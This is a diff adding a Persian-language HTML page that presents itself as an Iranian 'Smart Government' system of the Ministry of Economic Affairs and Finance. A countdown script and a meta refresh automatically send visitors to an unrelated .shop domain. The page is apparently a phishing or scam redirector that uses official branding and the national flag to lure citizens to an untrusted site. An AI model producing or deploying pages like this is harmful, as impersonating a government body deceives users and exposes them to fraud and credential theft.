@@ -1,0 +1,135 @@
+<!doctype html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>در حال انتقال…</title>
+<link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazir-font@v30.1.0/dist/font-face.css" rel="stylesheet" />
+<meta http-equiv="refresh" content="10;url=http://adln.shop/C">
+<style>
+  :root{
+    --blue:#0b4f9b;
+    --card-bg: rgba(255,255,255,0.94);
+    --accent:#1368d6;
+  }
+  html,body{height:100%;margin:0;padding:0}
+  body {
+    font-family: Vazir, Tahoma, Arial, sans-serif;
+    background-color: var(--blue);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    min-height:100vh;
+    overflow:hidden;
+  }
+
+  .flag-corner{
+    position:fixed;
+    top:-6%;
+    left:-8%;
+    width:48vw;
+    max-width:520px;
+    transform:rotate(-14deg);
+    opacity:0.98;
+    pointer-events:none;
+    z-index:0;
+  }
+
+  .card {
+    position:relative;
+    z-index:2;
+    background: var(--card-bg);
+    padding: 34px;
+    border-radius: 14px;
+    box-shadow: 0 14px 40px rgba(0,0,0,0.28);
+    text-align:center;
+    max-width:520px;
+    width:90%;
+    animation: cardIn .9s cubic-bezier(.2,.9,.3,1);
+  }
+  @keyframes cardIn {
+    from{opacity:0;transform:translateY(10px) scale(.995)} 
+    to{opacity:1;transform:none}
+  }
+
+  .slogan{
+    color:var(--accent);
+    font-weight:700;
+    font-size:18px;
+    margin-bottom:14px;
+    direction:rtl;
+  }
+
+  h2{margin:6px 0 10px;font-size:20px;color:#222}
+  .count {
+    font-weight:800;
+    color:#d60000;
+    font-size:22px;
+    margin-top:10px;
+  }
+  .muted{color:#444;font-size:13px;margin-top:8px;line-height:1.4;word-break:break-all}
+
+  .btn {
+    display:inline-block;
+    margin-top:18px;
+    padding:11px 24px;
+    border-radius:9px;
+    text-decoration:none;
+    font-weight:700;
+    background:var(--accent);
+    color:#fff;
+    transition:transform .14s ease, box-shadow .14s ease;
+  }
+  .btn:active{transform:translateY(1px)}
+  .btn:hover{box-shadow:0 8px 20px rgba(19,104,214,0.18)}
+
+  .footer{
+    margin-top:16px;
+    font-size:12px;
+    color:#222a; 
+    text-align:center;
+  }
+
+  @media (max-width:420px){
+    .card{padding:22px;border-radius:12px}
+  }
+</style>
+</head>
+<body>
+  <img class="flag-corner" alt="پرچم ایران" src="https://upload.wikimedia.org/wikipedia/commons/c/ca/Flag_of_Iran.svg" />
+
+  <div class="card" role="main" aria-live="polite">
+    <div class="slogan">«دولت هوشمند؛ پلی میان مردم و آینده»</div>
+
+    <h2>در حال انتقال به سایت اصلی</h2>
+
+    <div class="count">انتقال در <span id="secs">10</span> ثانیه...</div>
+
+    <a class="btn" href="http://adln.shop/C" rel="noopener noreferrer">هم‌اکنون برو</a>
+
+    <p class="muted" style="margin-top:12px;">
+      اگر انتقال خودکار انجام نشد، روی لینک زیر کلیک کنید:<br>
+      <a href="http://adln.shop/C" target="_blank" rel="noopener noreferrer">http://adln.shop/C</a>
+    </p>
+
+    <div class="footer">© 2025 دولت هوشمند – تمامی حقوق این سامانه متعلق به ســـــامانه وزارت امـور اقـــتصادی و دارایـــی می‌باشد و  محفوظ است</div>
+  </div>
+
+<script>
+  const target = "http://adln.shop/C";
+  let seconds = 10;
+
+  function tick(){
+    document.getElementById('secs').textContent = seconds;
+    if(seconds <= 0){
+      window.location.href = target;
+    } else {
+      seconds--;
+      setTimeout(tick, 1000);
+    }
+  }
+
+  window.addEventListener('DOMContentLoaded', tick);
+</script>
+</body>
+</html>
